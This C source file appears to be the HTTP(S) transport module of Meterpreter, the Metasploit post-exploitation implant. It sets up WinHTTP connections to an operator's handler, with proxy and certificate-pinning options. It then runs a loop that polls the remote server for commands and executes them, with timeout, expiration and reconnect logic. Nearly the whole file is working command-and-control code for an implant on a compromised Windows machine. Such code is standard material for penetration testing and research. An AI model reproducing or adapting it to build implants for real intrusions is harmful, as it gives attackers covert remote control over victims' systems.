/*!
 * @file server_transport_tcp.c
 * @remark This file doesn't use precompiled headers because metsrv.h includes a bunch of
 *         of definitions that clash with those found in winhttp.h. Hooray Win32 API. I hate you.
 */
#include "../../common/common.h"
#include <winhttp.h>

#define HOSTNAME_LEN 512
#define URLPATH_LEN 1024
#define METERPRETER_CONST_OFFSET 12

/*!
 * @brief Initialise the HTTP(S) connection.
 * @param remote Pointer to the remote instance with the HTTP(S) transport details wired in.
 * @param sock Reference to the original socket FD passed to metsrv (ignored);
 * @return Indication of success or failure.
 */
static BOOL server_init_http(Remote* remote, SOCKET fd)
{
	URL_COMPONENTS bits;
	wchar_t tmpHostName[512];
	wchar_t tmpUrlPath[1024];
	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

	dprintf("[WINHTTP] Initialising ...");

	// configure proxy
	if (ctx->proxy && wcscmp(ctx->proxy, L"METERPRETER_PROXY") != 0)
	{
		dprintf("[DISPATCH] Configuring with proxy: %S", ctx->proxy);
		ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_NAMED_PROXY, ctx->proxy, WINHTTP_NO_PROXY_BYPASS, 0);
	}
	else
	{
		ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	}

	if (!ctx->internet)
	{
		dprintf("[DISPATCH] Failed WinHttpOpen: %d", GetLastError());
		return FALSE;
	}

	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", ctx->internet);

	// The InternetCrackUrl method was poorly designed...
	ZeroMemory(tmpHostName, sizeof(tmpHostName));
	ZeroMemory(tmpUrlPath, sizeof(tmpUrlPath));

	ZeroMemory(&bits, sizeof(bits));
	bits.dwStructSize = sizeof(bits);

	bits.dwHostNameLength = HOSTNAME_LEN - 1;
	bits.lpszHostName = tmpHostName;

	bits.dwUrlPathLength = URLPATH_LEN - 1;
	bits.lpszUrlPath = tmpUrlPath;

	dprintf("[DISPATCH] About to crack URL: %S", remote->transport->url);
	WinHttpCrackUrl(remote->transport->url, 0, 0, &bits);

	SAFE_FREE(ctx->uri);
	ctx->uri = _wcsdup(tmpUrlPath);
	remote->transport->start_time = current_unix_timestamp();
	remote->transport->comms_last_packet = current_unix_timestamp();

	dprintf("[DISPATCH] Configured URI: %S", ctx->uri);
	dprintf("[DISPATCH] Host: %S Port: %u", tmpHostName, bits.nPort);

	// Allocate the connection handle
	ctx->connection = WinHttpConnect(ctx->internet, tmpHostName, bits.nPort, 0);
	if (!ctx->connection)
	{
		dprintf("[DISPATCH] Failed WinHttpConnect: %d", GetLastError());
		return FALSE;
	}

	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", ctx->connection);

	// Bring up the scheduler subsystem.
	return scheduler_initialize(remote) == ERROR_SUCCESS;
}

/*!
 * @brief Deinitialise the HTTP(S) connection.
 * @param remote Pointer to the remote instance with the HTTP(S) transport details wired in.
 * @return Indication of success or failure.
 */
static DWORD server_deinit_http(Remote* remote)
{
	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

	dprintf("[WINHTTP] Deinitialising ...");

	WinHttpCloseHandle(ctx->connection);
	WinHttpCloseHandle(ctx->internet);

	dprintf("[DISPATCH] calling scheduler_destroy...");
	scheduler_destroy();

	dprintf("[DISPATCH] calling command_join_threads...");
	command_join_threads();

	return TRUE;
}

/*!
 * @brief The servers main dispatch loop for incoming requests using HTTP(S).
 * @param remote Pointer to the remote endpoint for this server connection.
 * @param dispatchThread Pointer to the main dispatch thread.
 * @returns Indication of success or failure.
 */
static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet* packet = NULL;
	THREAD* cpt = NULL;
	DWORD ecount = 0;
	DWORD delay = 0;
	Transport* transport = remote->transport;
	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

	while (running)
	{
		if (transport->comms_timeout != 0 && transport->comms_last_packet + transport->comms_timeout < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to communication timeout");
			break;
		}

		if (transport->expiration_end != 0 && transport->expiration_end < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to hardcoded expiration time");
			dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), transport->expiration_end);
			break;
		}

		if (event_poll(dispatchThread->sigterm, 0))
		{
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}

		dprintf("[DISPATCH] Reading data from the remote side...");
		result = packet_receive_via_http(remote, &packet);
		if (result != ERROR_SUCCESS)
		{
			// Update the timestamp for empty replies
			if (result == ERROR_EMPTY)
			{
				transport->comms_last_packet = current_unix_timestamp();
			}
			else if (result == ERROR_WINHTTP_SECURE_INVALID_CERT)
			{
				// This means that the certificate validation failed, and so
				// we don't trust who we're connecting with. Bail out, pretending
				// that it was clean
				result = ERROR_SUCCESS;
				break;
			}

			if (ecount < 10)
			{
				delay = 10 * ecount;
			}
			else
			{
				delay = 100 * ecount;
			}

			ecount++;

			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
			Sleep(min(10000, delay));
			continue;
		}

		transport->comms_last_packet = current_unix_timestamp();

		// Reset the empty count when we receive a packet
		ecount = 0;

		dprintf("[DISPATCH] Returned result: %d", result);

		running = command_handle(remote, packet);
		dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
	}

	return result;
}

/*!
 * @brief Destroy the HTTP(S) transport.
 * @param transport Pointer to the HTTP(S) transport to reset.
 */
static void transport_destroy_http(Remote* remote)
{
	if (remote && remote->transport && remote->transport->type != METERPRETER_TRANSPORT_SSL)
	{
		HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

		dprintf("[TRANS HTTP] Destroying http transport for url %S", remote->transport->url);

		if (ctx)
		{
			SAFE_FREE(ctx->cert_hash);
			SAFE_FREE(ctx->proxy);
			SAFE_FREE(ctx->proxy_pass);
			SAFE_FREE(ctx->proxy_user);
			SAFE_FREE(ctx->ua);
			SAFE_FREE(ctx->uri);
		}
		SAFE_FREE(remote->transport->url);
		SAFE_FREE(remote->transport->ctx);
		SAFE_FREE(remote->transport);
	}
}

/*!
 * @brief Create an HTTP(S) transport from the given settings.
 * @param ssl Indication of whether to use SSL or not.
 * @param url URL for the HTTP(S) session.
 * @param ua User agent to use for requests.
 * @param proxy Proxy server information (can be NULL).
 * @param proxyUser Proxy user name (can be NULL).
 * @param proxyPass Proxy password (can be NULL).
 * @param certHash Expected SHA1 hash of the MSF server (can be NULL).
 * @param expirationTime The time used for session expiration.
 * @param commsTimeout The timeout used for individual communications.
 * @param retryTotal The total number of seconds to continue trying to reconnect comms.
 * @param retryWait The number of seconds to wait between each reconnect attempt.
 * @return Pointer to the newly configured/created HTTP(S) transport instance.
 */
Transport* transport_create_http(BOOL ssl, wchar_t* url, wchar_t* ua, wchar_t* proxy,
	wchar_t* proxyUser, wchar_t* proxyPass, PBYTE certHash, int expirationTime, int commsTimeout,
	UINT retryTotal, UINT retryWait)
{
	Transport* transport = (Transport*)malloc(sizeof(Transport));
	HttpTransportContext* ctx = (HttpTransportContext*)malloc(sizeof(HttpTransportContext));

	dprintf("[TRANS HTTP] Creating http transport for url %S", url);

	memset(transport, 0, sizeof(Transport));
	memset(ctx, 0, sizeof(HttpTransportContext));

	SAFE_FREE(ctx->ua);
	if (ua)
	{
		ctx->ua = _wcsdup(ua);
	}
	SAFE_FREE(ctx->proxy);
	if (proxy && wcscmp(proxy + METERPRETER_CONST_OFFSET, L"PROXY") != 0)
	{
		ctx->proxy = _wcsdup(proxy);
	}
	SAFE_FREE(ctx->proxy_user);
	if (proxyUser && wcscmp(proxyUser + METERPRETER_CONST_OFFSET, L"USERNAME_PROXY") != 0)
	{
		ctx->proxy_user = _wcsdup(proxyUser);
	}
	SAFE_FREE(ctx->proxy_pass);
	if (proxyPass && wcscmp(proxyPass + METERPRETER_CONST_OFFSET, L"PASSWORD_PROXY") != 0)
	{
		ctx->proxy_pass = _wcsdup(proxyPass);
	}
	ctx->ssl = ssl;

	// only apply the cert hash if we're given one and it's not the global value
	SAFE_FREE(ctx->cert_hash);
	if (certHash && strncmp((char*)(certHash + METERPRETER_CONST_OFFSET), "SSL_CERT_HASH", 20) != 0)
	{
		ctx->cert_hash = (PBYTE)malloc(sizeof(BYTE) * 20);
		memcpy(ctx->cert_hash, certHash, 20);
	}

	transport->type = ssl ? METERPRETER_TRANSPORT_HTTPS : METERPRETER_TRANSPORT_HTTP;
	transport->url = _wcsdup(url);
	transport->packet_receive = packet_receive_via_http;
	transport->packet_transmit = packet_transmit_via_http;
	transport->server_dispatch = server_dispatch_http;
	transport->transport_init = server_init_http;
	transport->transport_deinit = server_deinit_http;
	transport->transport_destroy = transport_destroy_http;
	transport->ctx = ctx;
	transport->comms_timeout = commsTimeout;
	transport->expiration_time = expirationTime;
	transport->expiration_end = current_unix_timestamp() + expirationTime;
	transport->start_time = current_unix_timestamp();
	transport->comms_last_packet = current_unix_timestamp();
	transport->retry_total = retryTotal;
	transport->retry_wait = retryWait;

#ifdef DEBUGTRACE
	if (ssl && certHash)
	{
		PBYTE hash = certHash;
		dprintf("[SERVER] Using HTTPS transport: Hash set to: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
			hash[0], hash[1], hash[2], hash[3], hash[4], hash[5], hash[6], hash[7], hash[8], hash[9], hash[10],
			hash[11], hash[12], hash[13], hash[14], hash[15], hash[16], hash[17], hash[18], hash[19]);
		dprintf("[SERVER] is validating hashes %p", hash);
	}
#endif

	return transport;
}
